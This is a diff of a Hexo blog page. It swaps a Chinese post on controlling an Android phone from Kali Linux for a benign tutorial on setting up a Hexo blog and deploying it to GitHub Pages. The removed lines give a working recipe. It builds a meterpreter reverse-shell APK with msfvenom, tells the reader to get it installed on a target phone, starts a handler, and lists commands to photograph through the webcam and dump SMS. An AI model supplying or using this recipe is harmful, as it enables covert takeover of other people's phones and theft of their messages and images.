@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="kali linux 控制安卓手机, codervibe@blog">
+    <meta name="keywords" content="hexo-开源框架-创建博客, codervibe@blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>kali linux 控制安卓手机 | codervibe@blog</title>
+    <title>hexo-开源框架-创建博客 | codervibe@blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -327,12 +327,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">kali linux 控制安卓手机</h1>
+                    <h1 class="description center-align post-title">hexo-开源框架-创建博客</h1>
                 </div>
             </div>
         </div>
@@ -449,8 +449,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/kali-linux/">
-                                <span class="chip bg-color">kali linux</span>
+                            <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                                <span class="chip bg-color">博客</span>
+                            </a>
+                        
+                            <a href="/tags/hexo/">
+                                <span class="chip bg-color">hexo</span>
+                            </a>
+                        
+                            <a href="/tags/Github/">
+                                <span class="chip bg-color">Github</span>
                             </a>
                         
                     </div>
@@ -461,8 +469,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Linux/" class="post-category">
-                                Linux
+                            <a href="/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%8E%E4%BC%98%E5%8C%96/" class="post-category">
+                                网站建设与优化
                             </a>
                         
                     </div>
@@ -488,14 +496,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    422
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -510,27 +518,70 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
-<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
-<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
-<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
-<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
-<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
-set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
-set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
-app_list # 安装的软件列表
-webcam_snap # 打开摄像头并拍照
-dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-</li>
+                <h1 id="hexo-开源框架-创建博客"><a href="#hexo-开源框架-创建博客" class="headerlink" title="hexo-开源框架-创建博客"></a>hexo-开源框架-创建博客</h1><h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p> 现在随着计算机的飞速发展，拥有一个属于自己的博客，是一件非常平常的事。<br> 使用hexo搭建一个属于自己的个人博客，是即快捷又美观的一种方式，也是非常<br> 受到人们的喜爱的。</p>
+<h2 id="hexo-介绍"><a href="#hexo-介绍" class="headerlink" title="hexo 介绍"></a>hexo 介绍</h2><p> Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客<br> 的首选框架。这里我们选用的是GitHub，你没看错，全球最大的代码交流网站。Hexo同时也是GitHub上的开源项目，参见：hexojs/<br> hexo 如果想要更加全面的了解Hexo，可以到其官网 Hexo 了解更多的细节，因为Hexo的创建者是台湾人，对中文的支持很友好，<br> 可以选择中文进行查看。这里，默认各位猿/媛儿都知道GitHub就不再赘述。</p>
+<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p> Git 的安装方法可以在 <a target="_blank" rel="noopener" href="https://www.baidu.com/">这里</a> 找到，我就不提太多了，主要说一下安装完成后的各项配置。<br> Git 在提交更改的时候，会需要提交者的邮箱和用户名，这可以通过以下命令来设置：<br> <a target="_blank" rel="noopener" href="https://git-scm.com/downloads">Git下载连接</a><br> </p><pre class="line-numbers language-none"><code class="language-none">git config --global user.email "Your email 你的邮箱"
+git config --global user.name "Your username 你的用户名"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br> 这样会进行全局设置，即以后不管在什么项目下，都会使用这样的配置来提交。而如果想要单独为某一个项目（例如个人博客）配置，<br> 可以删除 –global 选项，但需要在项目文件夹中进行。<br> 设定完成后可以将git安装目录下的 bin 目录的地址添加到环境变量<p></p>
+<pre class="line-numbers language-none"><code class="language-none">GIT_HOME
+盘符:\Program Files\Git\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在环境变量 Path中添加</p>
+<pre class="line-numbers language-none"><code class="language-none">%GIT_HOME%\bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="安装Node-JS"><a href="#安装Node-JS" class="headerlink" title="安装Node JS"></a>安装Node JS</h3><ul>
+<li>百度搜索NodeJS,找到官网–下载–即可<br><a href="%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1UsdWOjtRbF5NpERJa_-FgQ">windows 下 安装包分享链接</a><br>提取码: n6o8</li>
+<li>安装过程很简单，一直无脑下一步就行</li>
+<li>安装完成后可以查看一下是否安装的版本<pre class="line-numbers language-none"><code class="language-none">node -v #查看node版本
+npm  -v  #查看npm版本  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="安装cnmp"><a href="#安装cnmp" class="headerlink" title="安装cnmp"></a>安装cnmp</h3></li>
+<li>这里使用cnmp来安装 hexo 框架所以要先安装cnmp,但是由于墙的原因,这里使用淘宝的镜像下载安装  </li>
+<li>打开命令提示符，输入以下代码 <pre class="line-numbers language-none"><code class="language-none">npm install -g cnpm --registry=http://registry.npm.taobao.org #安装淘宝的cnpm 管理器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>安装完成后查看模块版本<pre class="line-numbers language-none"><code class="language-none">cnpm -v #查看cnpm版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="安装hexo框架"><a href="#安装hexo框架" class="headerlink" title="安装hexo框架"></a>安装hexo框架</h3><pre class="line-numbers language-none"><code class="language-none">cnpm install -g hexo-cli #安装hexo框架<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>查看hexo版本<pre class="line-numbers language-none"><code class="language-none">hexo -v #查看hexo版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="初始化博客"><a href="#初始化博客" class="headerlink" title="初始化博客"></a>初始化博客</h3></li>
+<li>在电脑任意一个位置或你想要的位置建立一个文件夹 例如: blog<pre class="line-numbers language-none"><code class="language-none">mkdir blog # 创建文件夹
+cd blog # 进入到文件夹里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+执行<pre class="line-numbers language-none"><code class="language-none">hexo init #生成博客 初始化博客<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+但是由于网络原因，很长时间都不会下载完成，如果你和我一样一直卡在这里，所以可以使用git 进行一个初始化的克隆<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/hexojs/hexo-starter.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+然后在当前文件夹的命令行内执行 以在本地启动hexo <pre class="line-numbers language-none"><code class="language-none">hexo s # 在本地启动hexo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+或者<pre class="line-numbers language-none"><code class="language-none">hexo server # 在本地启动hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+这个时候会报错并且会启动失败，你会得到这样的提示<pre class="line-numbers language-none"><code class="language-none">ERROR Cannot find module 'hexo' from 'X:\blog'
+ERROR Local hexo loading failed in X:\blog
+ERROR Try running: 'rm -rf node_modules &amp;&amp; npm install --force'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+这是因为上面那个github项目没有module 导致的所以你可以执行<pre class="line-numbers language-none"><code class="language-none">npm install --force # 下载需要的moudel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+来进行下载需要的moudel<br>这时你再执行上面的启动命令,就能启动hexo博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+我们访问 <a target="_blank" rel="noopener" href="http://localhost:4000/">http://localhost:4000/</a> 就可以发现啥也没有 空白的页面<br>这是因为你的博客里没有主题 在hexo 框架里面有一个themes的文件夹 这个文件夹里放的就是主题，因此我们只要下载一个主题<br>就行，我们访问hexo的官方网站<a target="_blank" rel="noopener" href="https://hexo.io/themes/">https://hexo.io/themes/</a>在里面选择一款自己喜欢的进行<br>下载即可。<br>利用git 下载<pre class="line-numbers language-none"><code class="language-none">cd themes
+git clone git@github.com:fluid-dev/hexo-theme-fluid.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+此时还不能看到主题，回到博客的根下 <pre class="line-numbers language-none"><code class="language-none">cd ../<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+用EidtPuls或任意文本编辑器打开_config.yml 在里面找到 Themes: <a target="_blank" rel="noopener" href="https://hexo.io/themes/">https://hexo.io/themes/</a> 将下面的<pre class="line-numbers language-none"><code class="language-none"># Extensions
+## Plugins: https://hexo.io/plugins/
+## Themes: https://hexo.io/themes/
+theme: landscape<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+改为<pre class="line-numbers language-none"><code class="language-none"># Extensions
+## Plugins: https://hexo.io/plugins/
+## Themes: https://hexo.io/themes/
+theme: hexo-theme-fluid #这个就是主题放的文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+再次启动hexo 就可以访问博客了<pre class="line-numbers language-none"><code class="language-none">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+但是此时只有一个帖子时这个hello,world 里面是这个hexo 快速启动的用法 可以看一下里面说的我这里就不再描述<h3 id="将博客推送到远端服务器上"><a href="#将博客推送到远端服务器上" class="headerlink" title="将博客推送到远端服务器上"></a>将博客推送到远端服务器上</h3></li>
+<li>这里使用的服务器是我们的github <h3 id="创建可以访问的github仓库"><a href="#创建可以访问的github仓库" class="headerlink" title="创建可以访问的github仓库"></a>创建可以访问的github仓库</h3></li>
+<li>什么？你还没有github 账号？！ 赶紧去注册一个</li>
+<li>登录github账号之后新建一个仓库<pre class="line-numbers language-none"><code class="language-none">名字是你账号的名字(必须是你账号的名字).github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+例如:<pre class="line-numbers language-none"><code class="language-none">xxxxxxxx.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>权限设置为公开<br>可以添加一个备注，比如我的就是 我的hexo博客</li>
+<li>同时这也是后面访问的地址<br>建立好后在博客的根目录用EidtPuls或任意文本编辑器打开_config.yml<br>找到最后面的<pre class="line-numbers language-none"><code class="language-none"># Deployment
+## Docs: https://hexo.io/docs/one-command-deployment
+deploy:
+  type: ''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+修改为<pre class="line-numbers language-none"><code class="language-none"># Deployment
+## Docs: https://hexo.io/docs/deployment.html
+deploy:
+  type: git
+  repo: https://github.com/xxxxxxx/xxxxxxxx.github.io.git # 刚才建立仓库的地址
+  branch: master # 这个是git的分支 不写 默认主分支
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>由于hexo 没有办法提交到github 所以要安装一个插件<pre class="line-numbers language-none"><code class="language-none">cnpm install --save hexo-deployer-git #在blog目录下安装git部署插件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+安装完成之后只想如下命令<pre class="line-numbers language-none"><code class="language-none">hexo g 
+hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+在执行第二个命令时需要输入github的用户名和密码<br>命令执行完成之后就可以查看了</li>
 </ul>
 <h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
         document.querySelectorAll('.github-emoji')
@@ -575,7 +626,7 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://codervibe.fun/2020/08/26/kali%20linux%20%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/">https://codervibe.fun/2020/08/26/kali%20linux%20%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/</a>
+                    <a href="https://codervibe.fun/archives/e7c408a1.html">https://codervibe.fun/archives/e7c408a1.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -613,8 +664,16 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/kali-linux/">
-                                    <span class="chip bg-color">kali linux</span>
+                                <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                                    <span class="chip bg-color">博客</span>
+                                </a>
+                            
+                                <a href="/tags/hexo/">
+                                    <span class="chip bg-color">hexo</span>
+                                </a>
+                            
+                                <a href="/tags/Github/">
+                                    <span class="chip bg-color">Github</span>
                                 </a>
                             
                         </div>
@@ -832,61 +891,7 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/08/31/%E6%95%B4%E5%90%88SSM%E6%A1%86%E6%9E%B6/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="整合Spring+SpringMVC+Mybatis框架">
-                        
-                        <span class="card-title">整合Spring+SpringMVC+Mybatis框架</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            整合Spring+SpringMVC+Mybatis框架导语 主要是整合三大框架 简称 SSM
-配置 使用maven 来管理jar包和插件 项目启动使用 Tomcat 插件启动 Tomcat 端口号 8080 数据库使用Mysql 端口号 
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-31
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/javaweb%E6%A1%86%E6%9E%B6/" class="post-category">
-                                    javaweb框架
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Github/">
-                        <span class="chip bg-color">Github</span>
-                    </a>
-                    
-                    <a href="/tags/javaweb%E6%A1%86%E6%9E%B6/">
-                        <span class="chip bg-color">javaweb框架</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/08/26/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
+                <a href="/archives/b4c1f80b.html">
                     <div class="card-image">
                         
                         
@@ -904,9 +909,9 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -928,6 +933,58 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
                     
                     <a href="/tags/%E7%A0%B4%E8%A7%A3/">
                         <span class="chip bg-color">破解</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/archives/f70cbfb8.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Ncork内网穿透">
+                        
+                        <span class="card-title">Ncork内网穿透</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Ncork内网穿透什么是内网穿透？内网穿透是一个什么样的效果？
+内网穿透(Intranet penetration)  
+
+下面是某度的介绍内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/windows/" class="post-category">
+                                    windows
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
